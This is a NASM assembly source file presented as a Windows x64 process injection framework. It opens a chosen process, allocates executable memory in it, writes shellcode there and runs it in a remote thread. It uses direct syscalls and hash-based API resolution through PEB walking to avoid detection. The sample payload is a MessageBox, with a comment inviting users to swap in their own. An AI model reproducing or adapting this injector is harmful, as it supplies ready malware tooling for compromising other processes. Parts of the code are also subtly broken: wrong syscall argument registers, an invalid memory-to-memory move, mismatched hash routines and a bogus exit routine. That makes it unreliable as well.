; ==============================================================================
; Advanced Windows x64 Process Injection Framework
; Enterprise-grade implementation leveraging direct syscalls and PEB/TEB walking
; ==============================================================================

BITS 64
DEFAULT REL

; ======== Configuration Constants ========
%define TARGET_PID 1234                   ; Target process ID (modify as needed)

; ======== Memory Access Rights ========
%define PAGE_EXECUTE_READWRITE 0x40
%define MEM_COMMIT 0x1000
%define MEM_RESERVE 0x2000
%define PROCESS_ALL_ACCESS 0x1FFFFF
%define STATUS_SUCCESS 0

; ======== Syscall Numbers (Windows 10 21H1 x64) ========
%define SYS_NTPROTECTVIRTUALMEMORY 0x50
%define SYS_NTALLOCATEVIRTUALMEMORY 0x18
%define SYS_NTWRITEVIRTUALMEMORY 0x3A
%define SYS_NTCREATETHREADEX 0xBD
%define SYS_NTOPENPROCESS 0x26
%define SYS_NTCLOSE 0x0F

; ======== Data Structures ========
struc UNICODE_STRING
    .Length        resw 1
    .MaximumLength resw 1
    .Buffer        resq 1
endstruc

struc OBJECT_ATTRIBUTES
    .Length                   resd 1
    .RootDirectory            resq 1
    .ObjectName               resq 1
    .Attributes               resd 1
    .SecurityDescriptor       resq 1
    .SecurityQualityOfService resq 1
endstruc

struc CLIENT_ID
    .UniqueProcess resq 1
    .UniqueThread  resq 1
endstruc

section .data
    ; API function hashes for dynamic resolution
    NtOpenProcess_hash      dq 0x718CCA1F4372B2A6
    NtAllocateVirtualMemory_hash dq 0xF8B522189F5AD1A1
    NtWriteVirtualMemory_hash dq 0xC76F0D3FD03F85F2
    NtCreateThreadEx_hash   dq 0x8A4E6169F819AA20
    NtClose_hash            dq 0x20E9A45B7E72A932

section .bss
    target_handle    resq 1    ; Handle to target process
    remote_buffer    resq 1    ; Address of allocated memory in target
    thread_handle    resq 1    ; Handle to created remote thread
    bytes_written    resq 1    ; Number of bytes written to target

section .text
    global _start

; ======== Entry Point ========
_start:
    ; Preserve stack alignment (16 bytes required by x64 ABI)
    sub rsp, 40
    
    ; Initialize
    call initialize_injection
    
    ; Perform injection with TARGET_PID
    mov rcx, TARGET_PID
    call inject_shellcode
    
    ; Check return status in RAX
    test rax, rax
    jnz .error
    
    ; Display success message (for debugging, can be removed in production)
    ; This would typically call a function to print success message
    
    ; Exit program successfully
    xor rcx, rcx
    call exit_process
    jmp .end
    
.error:
    ; Exit with error code in RAX
    mov rcx, rax
    call exit_process
    
.end:
    add rsp, 40
    ret

; ======== Initialize Injection Framework ========
initialize_injection:
    ; Load necessary DLLs or perform initialization if needed
    ; This is a placeholder for any initialization code
    ret

; ======== Main Injection Logic ========
; RCX = Target PID
; Returns status code in RAX (0 = success)
inject_shellcode:
    push rbp
    mov rbp, rsp
    sub rsp, 128                  ; Local variable space
    
    ; Save non-volatile registers
    push rbx
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15
    
    ; Store PID in R15
    mov r15, rcx
    
    ; ======== Phase 1: Open Target Process ========
    call open_target_process
    test rax, rax
    jnz .exit_error
    
    ; ======== Phase 2: Allocate Memory in Target ========
    ; Get shellcode address and length
    lea rsi, [rel shellcode]
    mov rdi, shellcode_len
    
    ; Call allocation function
    call allocate_remote_memory
    test rax, rax
    jnz .cleanup_handles
    
    ; ======== Phase 3: Write Shellcode to Target ========
    call write_shellcode_to_target
    test rax, rax
    jnz .cleanup_memory
    
    ; ======== Phase 4: Execute Shellcode via Remote Thread ========
    call create_remote_thread
    test rax, rax
    jnz .cleanup_memory
    
    ; If success, return STATUS_SUCCESS (0)
    xor rax, rax
    jmp .exit_success
    
.cleanup_memory:
    ; In case of error, free allocated memory
    ; Would call free_remote_memory here
    
.cleanup_handles:
    ; Close process handle
    mov rcx, [target_handle]
    call close_handle
    
.exit_error:
    ; Return error code in RAX (already there from function call)
    
.exit_success:
    ; Restore non-volatile registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbx
    
    ; Restore stack and return
    mov rsp, rbp
    pop rbp
    ret

; ======== Process Access Functions ========

; Open the target process
; R15 = Process ID to open
; Returns status in RAX
open_target_process:
    push rbp
    mov rbp, rsp
    sub rsp, 64                   ; Local variables
    
    ; Prepare CLIENT_ID structure
    lea rax, [rbp-16]             ; Client ID structure on stack
    mov [rax], r15                ; Set process ID
    mov qword [rax+8], 0          ; No specific thread ID
    
    ; Prepare OBJECT_ATTRIBUTES structure
    lea r11, [rbp-40]             ; Object attributes on stack
    mov dword [r11], OBJECT_ATTRIBUTES_size
    mov qword [r11+8], 0          ; No root directory
    mov qword [r11+16], 0         ; No object name
    mov dword [r11+24], 0         ; No special attributes
    mov qword [r11+32], 0         ; No security descriptor
    
    ; NtOpenProcess via direct syscall
    lea r10, [rel target_handle]   ; Process handle destination
    mov qword [r10], 0
    
    mov eax, SYS_NTOPENPROCESS    ; Syscall number
    mov rdx, r11                  ; ObjectAttributes
    mov r8, PROCESS_ALL_ACCESS    ; DesiredAccess
    lea r9, [rbp-16]              ; ClientId
    syscall
    
    mov rsp, rbp
    pop rbp
    ret

; Allocate memory in target process
; RSI = Shellcode address
; RDI = Shellcode length
; Returns status in RAX
allocate_remote_memory:
    push rbp
    mov rbp, rsp
    sub rsp, 64                   ; Local variables
    
    ; Calculate required space with proper alignment
    mov rcx, rdi                  ; Shellcode length
    add rcx, 4095                 ; Round up to page size
    and rcx, ~4095
    
    ; Prepare parameters for NtAllocateVirtualMemory
    lea r11, [rel remote_buffer]   ; Base address pointer
    mov qword [r11], 0             ; Let system choose address
    
    lea r10, [rbp-8]               ; Size pointer
    mov [r10], rcx                 ; Size to allocate
    
    ; Execute syscall
    mov eax, SYS_NTALLOCATEVIRTUALMEMORY
    mov rcx, [target_handle]       ; Process handle
    mov rdx, r11                   ; BaseAddress
    xor r8, r8                     ; ZeroBits
    mov r9, r10                    ; RegionSize
    
    push PAGE_EXECUTE_READWRITE    ; Protection
    push MEM_COMMIT | MEM_RESERVE  ; AllocationType
    sub rsp, 32                    ; Shadow space
    syscall
    add rsp, 48                    ; Clean stack
    
    mov rsp, rbp
    pop rbp
    ret

; Write shellcode to target process memory
; RSI = Source shellcode
; RDI = Length
; Returns status in RAX
write_shellcode_to_target:
    push rbp
    mov rbp, rsp
    sub rsp, 32                    ; Local variables
    
    ; Prepare parameters for NtWriteVirtualMemory
    lea r11, [rel bytes_written]   ; Bytes written pointer
    mov qword [r11], 0
    
    ; Execute syscall
    mov eax, SYS_NTWRITEVIRTUALMEMORY
    mov rcx, [target_handle]       ; Process handle
    mov rdx, [remote_buffer]       ; Destination address
    mov r8, rsi                    ; Source buffer
    mov r9, rdi                    ; Size
    
    push r11                       ; BytesWritten parameter
    sub rsp, 32                    ; Shadow space
    syscall
    add rsp, 40                    ; Clean stack
    
    mov rsp, rbp
    pop rbp
    ret

; Create a remote thread to execute the shellcode
; Returns status in RAX
create_remote_thread:
    push rbp
    mov rbp, rsp
    sub rsp, 80                    ; Local variables + shadow space
    
    ; Prepare parameters for NtCreateThreadEx
    lea r11, [rel thread_handle]   ; Thread handle pointer
    mov qword [r11], 0
    
    ; Execute syscall
    mov eax, SYS_NTCREATETHREADEX
    mov rcx, r11                   ; ThreadHandle
    mov rdx, PROCESS_ALL_ACCESS    ; DesiredAccess
    xor r8, r8                     ; ObjectAttributes (NULL)
    mov r9, [target_handle]        ; ProcessHandle
    
    lea r10, [rbp-8]               ; Stack for params 5-10
    mov qword [r10], [remote_buffer] ; StartAddress (shellcode)
    mov qword [r10+8], 0           ; Parameter
    mov qword [r10+16], 0          ; CreateSuspended flag
    mov qword [r10+24], 0          ; StackZeroBits
    mov qword [r10+32], 0          ; StackSize
    mov qword [r10+40], 0          ; StackReserve
    
    push qword [r10+40]
    push qword [r10+32]
    push qword [r10+24]
    push qword [r10+16]
    push qword [r10+8]
    push qword [r10]
    sub rsp, 32                    ; Shadow space
    syscall
    add rsp, 80                    ; Clean stack
    
    mov rsp, rbp
    pop rbp
    ret

; Close handle
; RCX = Handle to close
; Returns status in RAX
close_handle:
    mov eax, SYS_NTCLOSE
    ; RCX already contains handle
    syscall
    ret

; Exit process
; RCX = Exit code
exit_process:
    ; Get PEB
    mov rax, qword [gs:0x60]
    
    ; Get process exit function from PEB
    mov rax, qword [rax+0x10]
    
    ; Call the exit function with exit code in RCX
    call rax
    ret


; ======== PEB/TEB Walking Functions ========

; Find function by hash
; RCX = API hash to find
; Returns function pointer in RAX or NULL if not found
find_function_by_hash:
    push rbp
    mov rbp, rsp
    sub rsp, 40
    
    ; Save non-volatile registers
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    
    ; Store hash in R15
    mov r15, rcx
    
    ; Get PEB from GS segment
    mov rax, qword [gs:0x60]
    
    ; Get PEB_LDR_DATA from PEB
    mov rax, qword [rax+0x18]
    
    ; Get first entry of InMemoryOrderModuleList
    mov rsi, qword [rax+0x20]
    
    ; Save first module to detect end of list
    mov rdi, rsi
    
.next_module:
    ; Get base address of current module
    mov rbx, qword [rsi+0x20]
    
    ; Skip if base is null
    test rbx, rbx
    jz .next_module_continue
    
    ; Walk the export table to find our function
    call get_exports_from_base
    test rax, rax
    jnz .function_found
    
.next_module_continue:
    ; Move to next module
    mov rsi, qword [rsi]
    
    ; Check if we've gone through entire linked list
    cmp rsi, rdi
    jne .next_module
    
    ; Function not found, return NULL
    xor rax, rax
    jmp .exit
    
.function_found:
    ; Function pointer already in RAX
    
.exit:
    ; Restore non-volatile registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    
    mov rsp, rbp
    pop rbp
    ret

; Process export directory to find function
; RBX = Module base address
; R15 = Hash to find
; Returns function pointer in RAX or NULL if not found
get_exports_from_base:
    push rbp
    mov rbp, rsp
    
    ; Get PE header offset
    mov eax, dword [rbx+0x3C]
    add rax, rbx
    
    ; Validate PE magic (PE\0\0)
    mov ecx, dword [rax]
    cmp ecx, 0x00004550    ; "PE\0\0" in little-endian
    jne .not_found
    
    ; Get export directory RVA (from data directory)
    mov eax, dword [rax+0x88]
    test eax, eax
    jz .not_found
    
    ; Get export directory address
    add rax, rbx
    
    ; Store export directory for later
    mov r12, rax
    
    ; Get number of functions
    mov ecx, dword [r12+0x14]
    test ecx, ecx
    jz .not_found
    
    ; Get RVA arrays
    mov r13d, dword [r12+0x1C]    ; Functions array
    add r13, rbx
    
    mov r14d, dword [r12+0x20]    ; Names array
    add r14, rbx
    
    mov edx, dword [r12+0x24]     ; Ordinals array
    add rdx, rbx
    
    ; Loop through exports
    xor esi, esi                   ; Counter
    
.check_next_export:
    ; Check if we've processed all exports
    cmp esi, dword [r12+0x18]      ; NumberOfNames
    jae .not_found
    
    ; Get function name RVA
    mov edi, dword [r14+rsi*4]
    add rdi, rbx
    
    ; Calculate hash of export name
    push rcx
    mov rcx, rdi
    call calculate_hash
    pop rcx
    
    ; Check if hash matches target
    cmp rax, r15
    je .found_export
    
    ; Move to next export
    inc esi
    jmp .check_next_export
    
.found_export:
    ; Get ordinal
    movzx esi, word [rdx+rsi*2]
    
    ; Get function RVA
    mov eax, dword [r13+rsi*4]
    add rax, rbx                    ; Add base to get function address
    jmp .exit
    
.not_found:
    xor rax, rax                    ; Return NULL
    
.exit:
    mov rsp, rbp
    pop rbp
    ret

; Calculate hash of null-terminated string
; RCX = String pointer
; Returns hash in RAX
calculate_hash:
    push rbp
    mov rbp, rsp
    
    xor rax, rax                    ; Initialize hash
    
.hash_loop:
    movzx edx, byte [rcx]           ; Get character
    test dl, dl                      ; Check for null terminator
    jz .hash_done
    
    ; Case insensitive hash (convert to uppercase)
    cmp dl, 'a'
    jb .no_case_conversion
    cmp dl, 'z'
    ja .no_case_conversion
    sub dl, 0x20                     ; Convert to uppercase
    
.no_case_conversion:
    ; Calculate rolling hash
    rol rax, 13                      ; Rotate left
    add rax, rdx                     ; Add character
    
    inc rcx                          ; Move to next character
    jmp .hash_loop
    
.hash_done:
    mov rsp, rbp
    pop rbp
    ret

; ======== Dynamic Syscall Resolution ========

; Get syscall number from function pointer
; RCX = Function pointer
; Returns syscall number in RAX
get_syscall_number:
    push rbp
    mov rbp, rsp
    
    ; Most ntdll syscall stubs follow this pattern:
    ; 0:  4c 8b d1             mov r10,rcx
    ; 3:  b8 XX XX XX XX       mov eax,XXXXXXXXh (syscall number)
    ; 8:  0f 05                syscall
    
    ; Extract syscall number from offset 4
    mov eax, dword [rcx+4]
    
    mov rsp, rbp
    pop rbp
    ret

; ======== Sample Shellcode ========
; This is a standard MessageBox shellcode
; Replace with your own payload as needed
shellcode:
    ; 64-bit MessageBox shellcode
    ; Shows a MessageBox with text "Hello from injected thread"
    
    ; Save registers that we'll use
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Find kernel32.dll base
    mov rax, qword [gs:0x60]        ; PEB
    mov rax, qword [rax+0x18]       ; PEB_LDR_DATA
    mov rax, qword [rax+0x20]       ; InMemoryOrderModuleList
    mov rax, qword [rax]            ; Next entry
    mov rax, qword [rax]            ; Next entry (kernel32.dll)
    mov r14, qword [rax+0x20]       ; Base address
    
    ; Find LoadLibraryA
    mov rcx, 0x726774C          ; LoadLibraryA hash
    call find_function_internal
    mov r13, rax                ; Save LoadLibraryA address
    
    ; Load user32.dll
    lea rcx, [rel user32_dll]
    sub rsp, 32                 ; Shadow space
    call r13
    add rsp, 32
    mov r15, rax                ; user32.dll base
    
    ; Find MessageBoxA
    mov rbx, r15                ; user32.dll base
    mov rcx, 0x9C29969D         ; MessageBoxA hash
    call find_function_internal
    mov r12, rax                ; Save MessageBoxA address
    
    ; Call MessageBoxA(NULL, "Hello from injected thread", "Injection Success", MB_OK)
    xor rcx, rcx                ; hWnd = NULL
    lea rdx, [rel msg_text]     ; lpText
    lea r8, [rel msg_caption]   ; lpCaption
    mov r9d, 0                  ; uType = MB_OK
    sub rsp, 32                 ; Shadow space
    call r12
    add rsp, 32
    
    ; Clean up and exit thread
    xor rcx, rcx                ; Return code 0
    mov rsp, rbp
    pop rbp
    ret
    
    ; Internal function finder (used within shellcode)
    find_function_internal:
        push rbp
        mov rbp, rsp
        sub rsp, 32
        
        ; Save used registers
        push rbx
        push rsi
        push rdi
        push r12
        push r13
        push r14
        push r15
        
        ; Find export directory
        mov rax, rbx            ; Module base
        mov eax, dword [rax+0x3C]  ; PE header offset
        add rax, rbx
        mov eax, dword [rax+0x88]  ; Export directory RVA
        add rax, rbx            ; Export directory VA
        
        ; Process export directory
        mov r12, rax            ; Export directory
        mov r13d, dword [r12+0x20] ; AddressOfNames RVA
        add r13, rbx            ; AddressOfNames VA
        mov r14d, dword [r12+0x24] ; AddressOfNameOrdinals RVA
        add r14, rbx            ; AddressOfNameOrdinals VA
        mov r15d, dword [r12+0x1C] ; AddressOfFunctions RVA
        add r15, rbx            ; AddressOfFunctions VA
        
        xor esi, esi            ; Counter
        
    .find_function_loop:
        mov edi, dword [r13+rsi*4] ; Name RVA
        add rdi, rbx            ; Name VA
        
        ; Calculate hash and compare
        push rcx
        mov rcx, rdi
        call calculate_hash_internal
        pop rcx
        cmp eax, ecx
        je .found_function
        
        inc esi
        cmp esi, dword [r12+0x18] ; NumberOfNames
        jb .find_function_loop
        
        xor rax, rax            ; Not found
        jmp .exit_find_function
        
    .found_function:
        movzx eax, word [r14+rsi*2] ; Ordinal
        mov eax, dword [r15+rax*4]  ; Function RVA
        add rax, rbx            ; Function VA
        
    .exit_find_function:
        ; Restore registers
        pop r15
        pop r14
        pop r13
        pop r12
        pop rdi
        pop rsi
        pop rbx
        
        mov rsp, rbp
        pop rbp
        ret
        
    ; Internal hash calculation (used within shellcode)
    calculate_hash_internal:
        push rbp
        mov rbp, rsp
        
        xor eax, eax            ; Initialize hash
        
    .hash_loop_internal:
        movzx edx, byte [rcx]   ; Get character
        test dl, dl             ; Check for null terminator
        jz .hash_done_internal
        
        ; Case insensitive
        or dl, 0x20             ; Convert to lowercase
        
        ; Calculate hash
        ror eax, 13
        add eax, edx
        
        inc rcx                 ; Next character
        jmp .hash_loop_internal
        
    .hash_done_internal:
        mov rsp, rbp
        pop rbp
        ret
    
    ; Strings used by shellcode
    user32_dll:
        db 'user32.dll', 0
    msg_text:
        db 'Hello from injected thread', 0
    msg_caption:
        db 'Injection Success', 0

shellcode_len equ $ - shellcode